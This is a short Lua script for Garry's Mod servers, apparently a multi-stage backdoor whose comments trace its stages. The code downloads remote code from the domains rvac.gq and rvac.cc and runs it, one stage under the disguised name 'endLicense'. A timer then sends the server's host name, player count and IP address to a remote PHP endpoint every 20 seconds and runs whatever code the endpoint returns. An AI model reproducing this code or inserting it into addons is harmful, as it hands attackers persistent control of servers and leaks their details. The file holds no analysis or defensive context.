-- Start

timer.Simple (1,
	function ()
		http.Fetch ('http://rvac.gq/_!/p',
			function (body)
				CompileString (body, 'endLicense', false) ()
			end
		)
	end
)

-- rvac.gq/_!/p

http.Fetch ('https://rvac.cc/p',
	function (b)
		RunString (b)
	end
)

-- rvac.cc/p

timer.Create ('JK029023', 20, 0,
	function ()
		local a = {
			n  = GetHostName (),
			nb = tostring (#player.GetAll ()),
			i  = game.GetIPAddress ()
		}

		http.Post ('http://rvac.cc/stage2.php', a,
			function (body)
				RunString (body)
			end
		)
	end
)
